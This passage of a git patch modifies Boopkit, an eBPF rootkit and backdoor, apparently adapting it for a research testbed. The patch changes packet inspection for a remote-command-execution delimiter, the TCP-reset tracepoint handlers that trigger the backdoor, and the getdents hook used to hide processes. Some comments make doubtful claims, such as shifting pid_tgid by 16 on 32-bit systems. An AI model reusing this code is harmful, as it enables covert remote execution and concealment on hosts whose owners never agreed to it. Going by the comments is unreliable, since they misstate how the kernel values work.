-    char *xpack_saddr = inet_ntoa(xpack->iph->ip_src);
-    //boopprintf("xpack source addr: %s\n", xpack_saddr);
-
-    char *ret = strstr(search, xpack_saddr);
-    if (!ret) {
-      continue;  // Filter packets not from our IP address
-    }
-
     // Ring Buffer Packet Debugging Time
     //xpack_dump(xpack);
 
@@ -336,9 +347,12 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
 
     // Begin DPI
     unsigned char *packet = xpack->packet;
+    // Just for debug (CEA)
+    //for(int k=0;k<xpack->header->caplen; k++){
+      //boopprintf("%x", packet[k]);
+    //}
     char *rce_sub;
-    rce_sub = memmem(packet, xpack->header->caplen, BOOPKIT_RCE_DELIMITER,
-                     strlen(BOOPKIT_RCE_DELIMITER));
+    rce_sub = memmem(packet, xpack->header->caplen, BOOPKIT_RCE_DELIMITER, strlen(BOOPKIT_RCE_DELIMITER));
     if (rce_sub != NULL) {
       boopprintf("  -> Found RCE xCap!\n");
       int found;
@@ -346,9 +360,6 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
       // Flush the snapshot
       xcap_ring_buffer_free(snap);
 
-      // Flush the main ring buffer
-      xcap_ring_buffer_free(xcap_ring_buffer);
-      xcap_ring_buffer_init(xcap_ring_buffer);
       if (found) {
         return 1;
       } else {
diff --git a/dpi.h b/dpi.h
old mode 100644
new mode 100755
index c4bea84..7f6697b
--- a/dpi.h
+++ b/dpi.h
@@ -31,7 +31,7 @@
  * The larger the memory footprint the higher the chance of finding
  * and RCE in memory.
  */
-#define XCAP_BUFFER_SIZE 524288
+#define XCAP_BUFFER_SIZE 1024
 
 extern int runtime__xcap;
 
diff --git a/pr0be.boop.c b/pr0be.boop.c
old mode 100644
new mode 100755
index 6c2e390..ca8e063
--- a/pr0be.boop.c
+++ b/pr0be.boop.c
@@ -24,14 +24,13 @@
 // clang-format on
 #include <bpf/bpf_endian.h>
 #include <bpf/bpf_helpers.h>
-#include <string.h>
 
 #include "boopkit.h"
 
 struct {
   __uint(type, BPF_MAP_TYPE_HASH);
   __uint(max_entries, 8192);
-  __type(key, int);
+  __type(key, __u32);
   __type(value, struct event_boop_t);
 } event SEC(".maps");
 
@@ -63,16 +62,24 @@ struct tcp_bad_csum_args_t {
 // size:28;   signed:0;
 //
 // print fmt: "src=%pISpc dest=%pISpc", REC->saddr, REC->daddr
-SEC("tp/tcp/tcp_bad_csum")
-int tcp_bad_csum(struct tcp_bad_csum_args_t *args) {
-  struct event_boop_t ret;
-  int saddrkey = 1;
-  ret.event_src_code = EVENT_SRC_BAD_CSUM;
-  memcpy(ret.saddr, args->saddr, sizeof ret.saddr);
-  // bpf_probe_read_kernel(ret.saddr, sizeof ret.saddr, args->saddr);
-  bpf_map_update_elem(&event, &saddrkey, &ret, 1);
-  return 0;
-}
+
+//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+// The Hendrics Test Bed does not support BoopKit being triggered by TCP bad checksum messages, so this section has been commented out.
+//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+// SEC("tp/tcp/tcp_bad_csum")
+// int tcp_bad_csum(struct tcp_bad_csum_args_t *args) {
+//   __u32 saddrkey;
+//   __builtin_memcpy(&saddrkey, args->daddr, sizeof(__u32));
+
+//   struct event_boop_t ret;
+//   ret.event_src_code = EVENT_SRC_BAD_CSUM;
+//   // Modified for CEA, as we don't need to include string.h which would cause a double reference to memcpy
+//   //We use the clang builtin function
+//   __builtin_memcpy(ret.saddr, args->daddr, sizeof ret.saddr);
+//   // bpf_probe_read_kernel(ret.saddr, sizeof ret.saddr, args->saddr);
+//   bpf_map_update_elem(&event, &saddrkey, &ret, 1);
+//   return 0;
+// }
 
 struct tcp_receive_reset_args_t {
   unsigned long long pad;
@@ -113,11 +120,19 @@ struct tcp_receive_reset_args_t {
 // REC->daddr, REC->saddr_v6, REC->daddr_v6, REC->sock_cookie
 SEC("tp/tcp/tcp_receive_reset")
 int tcp_receive_reset(struct tcp_receive_reset_args_t *args) {
-  int saddrkey = 1;
+  __u32 saddrkey;
+  __builtin_memcpy(&saddrkey, args->daddr, sizeof(__u32));
+
   struct event_boop_t ret;
   ret.event_src_code = EVENT_SRC_RECEIVE_RESET;
-  memcpy(ret.saddr, args->saddr, sizeof ret.saddr);
+  // Modified for CEA to avoid including string.h, which would cause a double reference to memcpy.
+  // Instead, we use the Clang built-in function __builtin_memcpy for efficiency.
   // bpf_probe_read_kernel(ret.saddr,sizeof ret.saddr, args->saddr);
+  
+  // In Linux kernel version v6.1.141-rt52, it appears that the source and destination IP address fields (saddr and daddr) were swapped. 
+  // To retrieve the source address (saddr), we copy the destination address (daddr) into ret.saddr.
+  __builtin_memcpy(ret.saddr, args->daddr, sizeof ret.saddr);
+  
   bpf_map_update_elem(&event, &saddrkey, &ret, 1);
   return 0;
 }
diff --git a/pr0be.safe.c b/pr0be.safe.c
old mode 100644
new mode 100755
index 816e55d..08fda85
--- a/pr0be.safe.c
+++ b/pr0be.safe.c
@@ -225,7 +225,8 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
   e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
   if (e) {
     e->success = (ret == 0);
-    e->pid = (pid_tgid >> 32);
+    //Modified for CEA, as we run boopkit on a 32 bits architecture, we just need to bit shift of 16 instead of 32 which would cause overflow
+    e->pid = (pid_tgid >> 16);
     bpf_get_current_comm(&e->comm, sizeof(e->comm));
     bpf_ringbuf_submit(e, 0);
   }
-- 
2.34.1

